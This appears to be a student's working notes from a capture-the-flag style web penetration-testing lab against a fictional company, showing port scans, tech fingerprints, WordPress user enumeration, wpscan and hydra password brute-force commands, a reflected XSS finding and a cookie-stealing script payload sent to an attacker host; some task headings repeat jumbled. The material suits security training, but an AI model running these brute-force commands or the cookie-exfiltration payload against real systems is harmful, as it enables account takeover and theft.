@@ -1,0 +1,281 @@
+=====
+first nmap scan:
+
+PORT     STATE SERVICE
+80/tcp   open  http
+8009/tcp open  ajp13
+8080/tcp open  http-proxy
+8088/tcp open  radan-http
+9000/tcp open  cslistener
+
+=====
+i discovered all the ip-ports pointing to the following webapps:
+
+PORT     STATE SERVICE
+80/tcp   open  http ------------> 10.129.242.31:80   - http://www.trilocor.local:80     Main Trilocor website
+8009/tcp open  ajp13 -----------> 10.129.242.31:8009 - http://www.trilocor.local:8009/  PR website
+8080/tcp open  http-proxy ------> 10.129.242.31:8080 - http://www.trilocor.local:8080/  Jobs portal
+8088/tcp open  radan-http ------> 10.129.242.31:8088 - http://www.trilocor.local:8088/  HR Human resources website
+9000/tcp open  cslistener ------> 10.129.242.31:9000 - http://www.trilocor.local:9000/  Online shop
+
+
+TO-DO-LIST
+- test the assessment2.txt steps
+- fuzz everything with the correct wordlists
+- http://www.trilocor.local?s=sss -------------------> interesting parameter 
+- test and fuzz from /wp-admin/FUZZ and /wp-content/FUZZ
+- https://wpscan.com/blog/wpscan-brute-force/
+- https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
+- http://www.trilocor.local/wp-includes/wlwmanifest.xml
+http://www.trilocor.local/wp-admin/admin-ajax.php?action=
+/wp-admin/admin-ajax.php?do_reset_wordpress=
+/wp-admin/admin-ajax.php?action=kbslider_show_image&img=
+/wp-admin/admin-ajax.php?action=revslider_show_image&img=
+wp-admin/admin-footer.php
+
+
+
+
+
+continue: wpscan --url http://www.trilocor.local:80/ --passwords /home/deescalate/Downloads/3buffet/7-wordlists2.0/seclists_boosted/Passwords/Common-Credentials/10-million-password-list-top-500.txt
+          wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+
+
+- recursos pendientes:
+https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32
+https://www.acceis.fr/ffuf-advanced-tricks/
+=====
+wappalizzer results:
+
+CMS
+
+WordPress
+6.0.2
+Blogs
+
+WordPress
+6.0.2
+Font scripts
+
+Ionicons
+
+Google Font API
+
+Twitter Emoji (Twemoji)
+14.0.2
+
+Font Awesome
+Miscellaneous
+
+Webpack
+50% sure
+
+RSS
+
+Module Federation
+50% sure
+Web servers
+
+Nginx
+
+Apache HTTP Server
+2.4.41
+JavaScript graphics
+
+anime.js
+2.2.0
+Programming languages
+
+PHP
+7.4.26
+Operating systems
+
+UNIX
+
+Ubuntu
+CDN
+
+Cloudflare
+
+cdnjs
+Databases
+
+MySQL
+Page builder
+
+Elementor
+3.7.7
+JavaScript libraries
+
+OWL Carousel
+
+Hammer.js
+2.0.8
+
+jQuery UI
+1.13.1
+
+core-js
+3.24.1
+
+jQuery Migrate
+3.3.2
+
+jQuery
+1.12.3
+Reverse proxies
+
+Nginx
+UI frameworks
+
+Bootstrap
+3.3.6
+WordPress themes
+
+Astra
+3.9.2
+WordPress plugins
+
+Elementor
+3.7.7
+
+=====
+TASK 1 - 10PTS
+Try to gain access to the admin dashboard of Trilocor's main website to read the flag.
+---
+
+http://www.trilocor.local/robots.txt
+http://www.trilocor.local/wp-sitemap.xml
+http://www.trilocor.local/wp-sitemap.xml
+http://www.trilocor.local/wp-sitemap-users-1.xml
+http://www.trilocor.local/wp-admin/admin-ajax.php
+http://www.trilocor.local/xmlrpc.php  ------------------------------> XML-RPC server accepts POST requests only
+brute force at: xmlrpc.php 
+
+
+also check for:
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+
+
+
+=====
+TASK 2 - 5PTS
+Try to gain remote code execution on Trilocor's main website to read the (.txt) flag in the '/' directory.
+---
+=====
+TASK 3 - 5PTS
+
+
+=====
+TASK 2 - 5PTS
+Try to gain remote code execution on Trilocor's main website to read the (.txt) flag in the '/' directory.
+---
+=====
+TASK 3 - 5PTS
+
+
+=====
+TASK 2 - 5PTS
+Try to gain remote code execution on Trilocor's main website to read the (.txt) flag in the '/' directory.
+---
+=====
+TASK 3 - 5PTS
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+=====
+TASK 2 - 5PTS
+Try to gain remote code execution on Trilocor's main website to read the (.txt) flag in the '/' directory.
+---
+=====
+TASK 3 - 5PTS
+Try to bypass the login screen on Trilocor's HR dashboard application to read the flag.
+---
+=====
+TASK 4 - 15PTS
+Try to gain remote code execution on Trilocor's HR dashboard application to read the (.txt) flag in the '/' directory.
+---
+
+1- i tired fuzzing and found dashboard.php but it acutomatically redirects to login (/index.php)
+2- i found that when launch wpscan attack:
+   http://www.trilocor.local/index.php/author/web-admin/
+   http://www.trilocor.local/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+3- probably sql injection, ssi, ssti or esi, hydra don't work here
+
+
+
+
+
+[+]some additional info:
+ |
+ |
+ |wpscan users dump:
+ |[////////////////]
+ |trilocor.Vagient
+ |trilocor.Shiv
+ |trilocor.Fankle
+ |trilocor.Gradin
+ |trilocor.Emerald
+ |r.batty
+ |web-editor
+ |hr-smith - use hydra at Human resources login index.php
+ |pr-martins
+ |web-admin
+ |http://www.trilocor.local/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |http://www.trilocor.local/wp-json/oembed/1.0/embed?url=http://www.trilocor.local/&format=json
+ |http://www.trilocor.local/wp-sitemap-users-1.xml
+ |
+[+] WordPress theme in use: astra
+ | Location: http://www.trilocor.local/wp-content/themes/astra/
+ | Last Updated: 2023-10-23T00:00:00.000Z
+ | Readme: http://www.trilocor.local/wp-content/themes/astra/readme.txt
+ | [!] The version is out of date, the latest version is 4.4.0
+hydra -l hr-smith -P /home/deescalate/Downloads/3buffet/7-wordlists2.0/seclists_boosted/Passwords/probable-v2-top12000.txt -f 10.129.242.31 -s 8088 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='form'"
+
+=====
+TASK 5 - 10PTS
+Try to gain access to the admin panel of Trilocor's Jobs Portal to read the flag. 
+---
+=====
+TASK 6 - 10PTS
+Try to gain remote code execution on Trilocor's Jobs Portal to read the (.txt) flag in the '/' directory.
+---
+=====
+TASK 7 - 5PTS
+Try to gain access to Trilocor's PR admin panel to read the flag.
+---
+=====
+TASK 8 - 15PTS
+Try to gain remote code execution on Trilocor's PR admin panel to read the (.txt) flag in the '/' directory.
+---
+=====
+TASK 9 - 10PTS
+Try to gain admin access on Trilocor's Shop to read the flag.
+---
+
+ ok i got xss YEEEEEESSSS!!!!!
+ by trying infinite attempts of sqli manual and automatic on username and password at --->  username=web-admin&password=a
+ and nothing works
+ 
+ i noticed that get a parameter changing by submiting the sqli payloads and getting error too many times, specifically at ---> http://www.trilocor.local:9000/login?error=
+ 
+ so i tried manually with the classic: http://www.trilocor.local:9000/login?error=`%3Cscript%3Ealert(window.origin)%3C/script%3E`
+ 
+i get the xss valid response so ill continue & i'll try get rce directly or something.
+
+'><script src=http://10.10.14.24:4444/index1.php?c='+document.cookie</script>
+https://github.com/marktext/marktext/issues/3618
+https://positive.security/blog/dompdf-rce
+https://security-garage.com/index.php/es/vulnerabilidades/como-descubrimos-vulnerabilidades-xss-y-rce-durante-un-bug-bounty
+https://whynotsecurity.com/blog/xss-to-rce/
+https://pentest.co.uk/labs/leveraging-xss-to-get-rce-in-textpattern/
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss
+=====
+TASK 10 - 15PTS
+Try to gain remote code execution on the Trilocor Shop application to read the (.txt) flag in the '/' directory.
+---
